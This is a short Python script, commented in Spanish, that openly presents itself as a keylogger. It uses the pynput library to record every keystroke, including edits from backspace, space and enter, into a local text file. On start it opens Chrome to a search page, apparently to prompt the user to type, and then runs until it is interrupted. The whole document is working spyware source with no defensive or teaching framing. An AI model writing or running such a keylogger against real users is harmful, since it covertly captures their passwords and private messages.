# Librerías Externas
from pynput import keyboard
import os
import time
import webbrowser

# Mantenimiento
directorio_guardado = "salidas"
os.makedirs(directorio_guardado, exist_ok=True)
ARCHIVO_KEYLOG = os.path.join(directorio_guardado, "registro_teclas.txt")

# Función Principal del Keylogger
def al_presionar(tecla):
    try:
        k = tecla.char
        with open(ARCHIVO_KEYLOG, "a") as f:
            f.write(k)
    except AttributeError:
        # Manejar teclas especiales
        if tecla == keyboard.Key.delete or tecla == keyboard.Key.backspace:
            # Eliminar carácter anterior leyendo archivo, quitando último char y escribiendo de nuevo
            try:
                with open(ARCHIVO_KEYLOG, "r") as f:
                    content = f.read()
                if content:
                    content = content[:-1]  # Eliminar último carácter
                    with open(ARCHIVO_KEYLOG, "w") as f:
                        f.write(content)
            except:
                pass
        elif tecla == keyboard.Key.space:
            with open(ARCHIVO_KEYLOG, "a") as f:
                f.write(" ")
        elif tecla == keyboard.Key.enter:
            with open(ARCHIVO_KEYLOG, "a") as f:
                f.write("\n")
    except:
        # Otras teclas especiales, solo escribir la representación en cadena
        with open(ARCHIVO_KEYLOG, "a") as f:
            f.write(str(tecla))

listener = keyboard.Listener(on_press=al_presionar)
listener.start()

# Abrir Chrome al iniciar
print("[*] Abriendo Chrome...")
webbrowser.open("https://www.google.com")

print("[*] Keylogger ejecutándose correctamente...")

try:
    while True:
        time.sleep(30)
except KeyboardInterrupt:
    print("\n[*] Keylogger detenido.")
